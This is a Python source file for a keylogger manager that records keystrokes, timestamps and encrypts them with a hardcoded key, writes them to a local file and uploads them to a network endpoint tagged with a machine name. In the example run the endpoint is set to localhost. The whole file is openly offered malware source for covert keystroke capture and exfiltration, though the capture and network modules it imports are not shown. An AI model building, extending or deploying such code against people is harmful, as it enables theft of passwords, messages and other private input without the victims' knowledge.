
import json
import time
from KeyLoggerService import KeyLogger
from fileWriter import MyFile
from network_writer import NetworkWriter
from Encryption import Crypto

class KeyLoggerManager:
    def __init__(self, file_path="encrypt.txt", network_url=None, crypto_key="abcdefjhijklmnopqrstuvwxyz"):
        self.logger = KeyLogger()
        self.crypto = Crypto(crypto_key)
        self.file = MyFile(file_path)
        self.network_writer = NetworkWriter(network_url, self.crypto) if network_url else None

    def start_logger(self):
        self.logger.start_logging()

    def stop_logger(self, machine_name="Machine_02"):
        self.logger.stop_logging()
        words = self.logger.get_logged_keys()

        # time signature
        timestamped_data = []
        current_minute = time.strftime("%Y-%m-%d %H:%M")
        for w in words:
            timestamped_data.append(f"[{current_minute}] {w}")

        data = "\n".join(timestamped_data)

        # Encryption
        encrypted_data = self.crypto.process(data)

        # Local writing
        with open(self.file.file_name, "a", encoding="utf-8") as f:
            f.write(json.dumps(encrypted_data) + "\n")

        # Network sending
        if self.network_writer:
            self.network_writer.send_data(encrypted_data, machine_name)


if __name__ == "__main__":
    # Create the manager with local file + network sending
    manager = KeyLoggerManager(
        file_path="encrypt.txt",
        network_url="http://127.0.0.1:5000/api/upload"
    )

    # Start the keylogger
    manager.start_logger()

    # Stop the keylogger and processes data
    manager.stop_logger("Machine_02")

    # Display the file and its contents 
    print("File :", manager.file.file_name)
    print("File contain :", manager.file.read_file())
